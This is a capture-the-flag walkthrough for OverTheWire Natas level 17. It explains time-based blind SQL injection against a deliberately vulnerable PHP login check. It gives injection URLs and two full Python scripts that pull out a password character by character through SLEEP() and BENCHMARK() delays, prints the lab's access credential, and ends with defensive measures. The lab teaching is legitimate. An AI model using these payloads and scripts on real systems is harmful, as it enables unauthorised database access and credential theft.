17 Blind SQL Injection — Time-Based Hard

// Key Concepts

Time-Based Blind SQL SLEEP() Function Conditional Delay Data Exfiltration Automation

// Challenge Overview

This level is similar to Level 15 (blind SQL injection) but now no output is shown at all — the page always returns "This user exists" or "This user doesn't exist." However, the application is vulnerable to Time-Based Blind SQL Injection using the SLEEP() function.

// Initial Analysis

View the source code:

<?php if(array_key_exists("username", $_GET)) { $query = "SELECT * FROM users WHERE username='" . $_GET['username'] . "'"; $result = mysql_query($query); if(mysql_num_rows($result) > 0) { print "This user exists."; } else { print "This user doesn't exist."; } } ?>

The application now always shows a message, but we can use time-based delays to extract information.

💡 Time-Based Blind SQL Injection uses the SLEEP() function in MySQL (or pg_sleep() in PostgreSQL) to introduce a delay. If the condition is true, the query takes longer to execute.

// Solution Walkthrough

Step 1 — Test for time-based injection:

http://natas17.natas.labs.overthewire.org/?username=natas18' AND SLEEP(5) -- # If the page takes 5 seconds to load, the injection works!

Step 2 — Extract the password length:

http://natas17.natas.labs.overthewire.org/?username=natas18' AND LENGTH(password)=32 AND SLEEP(5) --

Step 3 — Extract characters one by one:

# Check if the first character is 'a' (ASCII 97) ?username=natas18' AND ASCII(SUBSTRING(password,1,1))=97 AND SLEEP(5) -- # Check if the first character is 'b' (ASCII 98) ?username=natas18' AND ASCII(SUBSTRING(password,1,1))=98 AND SLEEP(5) --

Step 4 — Automate with Python:

import requests import time url = "http://natas17.natas.labs.overthewire.org/" auth = ("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw") password = "" for position in range(1, 33): for ascii_val in range(48, 123): payload = f"natas18' AND ASCII(SUBSTRING(password, {position}, 1)) = {ascii_val} AND SLEEP(5) -- " params = {"username": payload} start_time = time.time() response = requests.get(url, auth=auth, params=params) elapsed_time = time.time() - start_time if elapsed_time > 4: # If the delay was 5 seconds, the condition was true password += chr(ascii_val) print(f"Found: {password}") break print(f"Complete password: {password}")

Using the BENCHMARK() function as an alternative:

import requests import time url = "http://natas17.natas.labs.overthewire.org/" auth = ("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw") password = "" for position in range(1, 33): for ascii_val in range(48, 123): # Using BENCHMARK() instead of SLEEP() payload = f"natas18' AND ASCII(SUBSTRING(password, {position}, 1)) = {ascii_val} AND BENCHMARK(50000000, MD5('test')) -- " params = {"username": payload} start_time = time.time() response = requests.get(url, auth=auth, params=params) elapsed_time = time.time() - start_time if elapsed_time > 2: # BENCHMARK() takes more than 2 seconds password += chr(ascii_val) print(f"Found: {password}") break print(f"Complete password: {password}")

// Why It Works

The time-based blind SQL injection works because:

  • SLEEP() function: MySQL's SLEEP() function pauses execution for a specified number of seconds.
  • Conditional execution: The SLEEP() is only executed if the condition is true.
  • Time difference: We can measure the response time to determine if the condition was true.
  • Character-by-character extraction: We can test each character position individually.

// Time-Based vs Boolean-Based Blind SQL

Feature Boolean-Based Time-Based
DetectionDifferent responsesTime differences
ReliabilityHighMedium (network latency)
SpeedFastSlow (5 seconds per query)
StealthNoticeableLess noticeable

// Defensive Measures

  • Use prepared statements with parameterized queries.
  • Input validation: Validate and sanitize all user input.
  • Rate limiting: Limit the number of queries per user.
  • Query timeout: Set a maximum query execution time.
  • Disable SLEEP() and BENCHMARK() functions if not needed.

// Key Takeaways

⏱️ Time-Based Extraction

Even without output or error messages, attackers can extract data using time delays. Always use prepared statements.

🛡️ Defense in Depth

Prepared statements are the primary defense. Additional layers include input validation and rate limiting.
